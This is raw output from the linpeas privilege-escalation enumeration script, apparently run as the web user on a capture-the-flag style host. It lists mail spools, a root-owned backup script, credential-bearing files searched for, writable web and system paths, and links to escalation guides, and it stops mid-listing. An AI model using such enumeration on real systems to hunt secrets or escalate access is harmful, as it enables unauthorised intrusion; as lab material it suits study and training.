+/home/milesdyson/share/notes/3.00 Artificial Intelligence.md
+/home/milesdyson/share/notes/2.01 Overview.md
+/home/milesdyson/share/notes/3.02 Planning.md
+/home/milesdyson/share/notes/1.04 Probability.md
+/home/milesdyson/share/notes/2.06 Natural Language Processing.md
+/home/milesdyson/share/notes/2.00 Machine Learning.md
+/home/milesdyson/share/notes/1.03 Calculus.md
+
+[+] Looking for installed mail applications
+dovecot
+postfix
+squirrelmail
+maildirmake.dovecot
+dovecot
+postfix
+postfix-add-filter
+postfix-add-policy
+sendmail
+squirrelmail-configure
+
+[+] Mails (limit 50)
+/var/mail/milesdyson
+/var/mail/root
+/var/spool/mail/milesdyson
+/var/spool/mail/root
+
+[+] Backup files?
+-rw-r--r-- 1 root root 128 Sep 17  2019 /var/lib/sgml-base/supercatalog.old
+-rw-r--r-- 1 root root 673 Sep 17  2019 /etc/xml/xml-core.xml.old
+-rw-r--r-- 1 root root 610 Sep 17  2019 /etc/xml/catalog.old
+-rwxr-xr-x 1 root root 74 Sep 17  2019 /home/milesdyson/backups/backup.sh
+-rw-r--r-- 1 root root 4679680 Oct 25 15:06 /home/milesdyson/backups/backup.tgz
+-rwxr-xr-x 1 root root 10504 Mar 14  2016 /usr/bin/tdbbackup.tdbtools
+
+[+] Looking for tables inside readable .db/.sqlite files (limit 100)
+ -> Extracting tables from /var/www/html/45kra24zxs28v3yd/administrator/templates/default/images/template/Thumbs.db (limit 20)
+ -> Extracting tables from /var/www/html/45kra24zxs28v3yd/administrator/templates/default/images/template/datagrid/Thumbs.db (limit 20)
+ -> Extracting tables from /var/www/html/config (limit 20)
+ -> Extracting tables from /etc/aliases.db (limit 20)
+
+[+] Web files?(output limit)
+/var/www/:
+total 12K
+drwxr-xr-x  3 root     root     4.0K Sep 17  2019 .
+drwxr-xr-x 14 root     root     4.0K Sep 17  2019 ..
+drwxr-xr-x  8 www-data www-data 4.0K Sep 17  2019 html
+
+/var/www/html:
+total 68K
+drwxr-xr-x 8 www-data www-data 4.0K Sep 17  2019 .
+drwxr-xr-x 3 root     root     4.0K Sep 17  2019 ..
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 2188 Aug 31  2015 /etc/bash.bashrc
+-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
+lrwxrwxrwx 1 root root 43 Sep 17  2019 /etc/systemd/system/timers.target.wants/snapd.snap-repair.timer -> /lib/systemd/system/snapd.snap-repair.timer
+lrwxrwxrwx 1 root root 9 Sep 17  2019 /home/milesdyson/.bash_history -> /dev/null
+Looking for possible passwords inside /home/milesdyson/.bash_history (limit 100)
+
+-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 /home/milesdyson/.bashrc
+-rw-r--r-- 1 milesdyson milesdyson 655 Sep 17  2019 /home/milesdyson/.profile
+-rwxr-xr-x 1 root root 138880 Aug 28  2019 /usr/lib/dovecot/config
+-rw-r--r-- 1 root root 3106 Oct 22  2015 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 3161 Apr 14  2016 /usr/share/byobu/profiles/bashrc
+-rw-r--r-- 1 root root 870 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 1865 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
+-rw------- 1 root root 0 Feb 26  2019 /etc/.pwd.lock
+-rw-r--r-- 1 root root 1430 Sep 17  2019 /etc/apparmor.d/cache/.features
+-rw-r--r-- 1 milesdyson milesdyson 220 Sep 17  2019 /home/milesdyson/.bash_logout
+-rw-r--r-- 1 root root 1319 Sep 17  2019 /var/lib/apparmor/profiles/.apparmor.md5sums
+-rw-r--r-- 1 root root 0 Oct 25 14:18 /run/network/.ifstate.lock
+-rw-r--r-- 1 root root 14 Mar 26  2009 /usr/share/squirrelmail/include/.htaccess
+-rw-r--r-- 1 root root 14 Mar 26  2009 /usr/share/squirrelmail/po/.htaccess
+-rw-r--r-- 1 root root 14 Mar 26  2009 /usr/share/squirrelmail/class/.htaccess
+-rw-r--r-- 1 root root 14 Mar 26  2009 /usr/share/squirrelmail/locale/.htaccess
+-rw-r--r-- 1 root root 14 Feb  5  2002 /usr/share/squirrelmail/plugins/squirrelspell/modules/.htaccess
+-rw-r--r-- 1 root root 14 Mar 26  2009 /usr/share/squirrelmail/help/.htaccess
+-rw-r--r-- 1 root root 14 Mar 26  2009 /usr/share/squirrelmail/functions/.htaccess
+-rw-r--r-- 1 root root 0 Feb 19  2019 /usr/share/php/.lock
+-rw-r--r-- 1 root root 0 Feb 19  2019 /usr/share/php/.depdblock
+-rw-r--r-- 1 root root 190984 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/.config.old
+-rw-r--r-- 1 root root 12506 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/kernel/.bounds.s.cmd
+-rw-r--r-- 1 root root 190860 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/.config
+-rw-r--r-- 1 root root 2391 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.conmakehash.cmd
+-rw-r--r-- 1 root root 2380 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.kallsyms.cmd
+-rw-r--r-- 1 root root 3239 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/selinux/genheaders/.genheaders.cmd
+-rw-r--r-- 1 root root 2839 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/selinux/mdp/.mdp.cmd
+-rw-r--r-- 1 root root 3387 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.recordmcount.cmd
+-rw-r--r-- 1 root root 110 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/kconfig/.conf.cmd
+-rw-r--r-- 1 root root 4917 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/kconfig/.zconf.tab.o.cmd
+-rw-r--r-- 1 root root 3755 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/kconfig/.conf.o.cmd
+-rw-r--r-- 1 root root 3972 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.insert-sys-cert.cmd
+-rw-r--r-- 1 root root 4268 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/basic/.fixdep.cmd
+-rw-r--r-- 1 root root 1193 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/basic/.bin2c.cmd
+-rw-r--r-- 1 root root 3568 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.sortextable.cmd
+-rw-r--r-- 1 root root 5133 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.sign-file.cmd
+-rw-r--r-- 1 root root 4451 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.sumversion.o.cmd
+-rw-r--r-- 1 root root 2537 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.mk_elfconfig.cmd
+-rw-r--r-- 1 root root 129 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.modpost.cmd
+-rw-r--r-- 1 root root 3485 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.file2alias.o.cmd
+-rw-r--r-- 1 root root 104 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.elfconfig.h.cmd
+-rw-r--r-- 1 root root 2425 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.empty.o.cmd
+-rw-r--r-- 1 root root 4622 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.modpost.o.cmd
+-rw-r--r-- 1 root root 5327 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.devicetable-offsets.s.cmd
+-rw-r--r-- 1 root root 2481 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/genksyms/.parse.tab.o.cmd
+-rw-r--r-- 1 root root 3347 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/genksyms/.lex.lex.o.cmd
+-rw-r--r-- 1 root root 2719 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/genksyms/.genksyms.o.cmd
+-rw-r--r-- 1 root root 153 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/genksyms/.genksyms.cmd
+-rw-r--r-- 1 root root 4495 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.extract-cert.cmd
+-rw-r--r-- 1 root root 3253 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.asn1_compiler.cmd
+-rw-r--r-- 1 root root 53148 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/kernel/.asm-offsets.s.cmd
+-rw-r--r-- 1 root root 3621 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.purgatory.o.cmd
+-rw-r--r-- 1 root root 360 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.purgatory.ro.cmd
+-rw-r--r-- 1 root root 1309 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.stack.o.cmd
+-rw-r--r-- 1 root root 6208 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.sha256.o.cmd
+-rw-r--r-- 1 root root 1379 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
+-rw-r--r-- 1 root root 3607 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.string.o.cmd
+-rw-r--r-- 1 root root 155 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd
+-rw-r--r-- 1 root root 1329 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.entry64.o.cmd
+-rw-r--r-- 1 root root 292 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
+-rw-r--r-- 1 root root 292 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
+-rw-r--r-- 1 root root 402 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
+-rw-r--r-- 1 root root 320 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
+-rw-r--r-- 1 root root 316 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
+-rw-r--r-- 1 root root 320 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
+-rw-r--r-- 1 root root 340 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
+-rw-r--r-- 1 root root 315 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
+-rw-r--r-- 1 root root 3362 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/tools/.relocs_32.o.cmd
+-rw-r--r-- 1 root root 3342 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/tools/.relocs_common.o.cmd
+-rw-r--r-- 1 root root 146 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/tools/.relocs.cmd
+-rw-r--r-- 1 root root 3362 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/tools/.relocs_64.o.cmd
+-rw-r--r-- 1 root root 21 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/.6930.d
+-rw-r--r-- 1 root root 820 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/.missing-syscalls.d
+-rw-r--r-- 1 root root 190591 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/.config.old
+-rw-r--r-- 1 root root 12449 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/kernel/.bounds.s.cmd
+grep: write error: Broken pipe
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
+-rwxr--r-- 1 www-data www-data 225747 Oct 25 15:04 /tmp/linpeas.sh
+-rw-r--r-- 1 root root 525 Sep 17  2019 /var/backups/dpkg.diversions.0
+-rw-r--r-- 1 root root 14050 Sep 17  2019 /var/backups/apt.extended_states.0
+-rw-r--r-- 1 root root 51200 Sep 17  2019 /var/backups/alternatives.tar.0
+-rw-r--r-- 1 root root 1440 Sep 17  2019 /var/backups/apt.extended_states.3.gz
+-rw-r--r-- 1 root root 11 Sep 17  2019 /var/backups/dpkg.arch.0
+-rw-r--r-- 1 root root 1597 Sep 17  2019 /var/backups/apt.extended_states.1.gz
+-rw-r--r-- 1 root root 1469 Sep 17  2019 /var/backups/apt.extended_states.2.gz
+-rw-r--r-- 1 root root 332 Sep 17  2019 /var/backups/dpkg.statoverride.0
+-rw-r--r-- 1 root root 623640 Sep 17  2019 /var/backups/dpkg.status.0
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/mqueue/linpeas.txt
+/dev/shm
+/run/lock
+/run/lock/apache2
+/run/screen/S-www-data
+/tmp
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+/tmp/linpeas.sh
+/tmp/tmux-33
+/var/cache/apache2/mod_cache_disk
+/var/crash
+/var/lib/lxcfs/cgroup/memory/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by\x2duuid-354616bf\x2d923c\x2d43d3\x2da040\x2dae36babbbab3.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-xvda5.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dovecot.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/nmbd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/postfix.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/samba-ad-dc.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/smbd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/winbind.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
+/var/lib/php/sessions
+/var/spool/samba
+/var/tmp
+/var/www/html
+/var/www/html/45kra24zxs28v3yd
+/var/www/html/45kra24zxs28v3yd/administrator
+/var/www/html/45kra24zxs28v3yd/administrator/Configuration.php
+/var/www/html/45kra24zxs28v3yd/administrator/alerts
+/var/www/html/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php
+/var/www/html/45kra24zxs28v3yd/administrator/alerts/alertIFrame.php
+/var/www/html/45kra24zxs28v3yd/administrator/alerts/alertImage.php
+/var/www/html/45kra24zxs28v3yd/administrator/alerts/defaultAlert.php
+/var/www/html/45kra24zxs28v3yd/administrator/classes
+/var/www/html/45kra24zxs28v3yd/administrator/classes/Content.php
+/var/www/html/45kra24zxs28v3yd/administrator/classes/DataBase.php
+/var/www/html/45kra24zxs28v3yd/administrator/classes/Menu.php
+/var/www/html/45kra24zxs28v3yd/administrator/classes/Paginator.php
+/var/www/html/45kra24zxs28v3yd/administrator/classes/Security.php
+/var/www/html/45kra24zxs28v3yd/administrator/classes/User.php
+/var/www/html/45kra24zxs28v3yd/administrator/components
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_general_config
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_general_config/index.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/controllers
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/controllers/Menu.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/index.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/Menu.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/tmpl
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/tmpl/add_permissions.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/tmpl/edit_menu.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/tmpl/list_menu.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/controllers
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/controllers/Admin_Table.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/controllers/Table_Manager.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Check.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Date.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/File.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Id.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Radio.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Select.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Text.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/TextArea.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Date.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/File.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Radio.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Select.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Text.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/TextArea.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/index.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/Admin_Table.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/Table_Manager.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl/edit_admin_table.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl/edit_table_manager.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl/list_admin_table.php
+/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl/list_table_manager.php
+/var/www/html/45kra24zxs28v3yd/administrator/index.php
+/var/www/html/45kra24zxs28v3yd/administrator/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/Copy
+of
+tu_main.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/jquery-ui.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.md5.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.sha1.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.validate.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/swfobject.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/langs/en.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/css/advhr.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/js/rule.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/rule.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/css/advimage.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/image.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/js/image.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/css/advlink.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/js/advlink.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/link.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlist
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlist/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlist/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autolink
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autolink/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autolink/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autoresize
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autoresize/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autoresize/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave
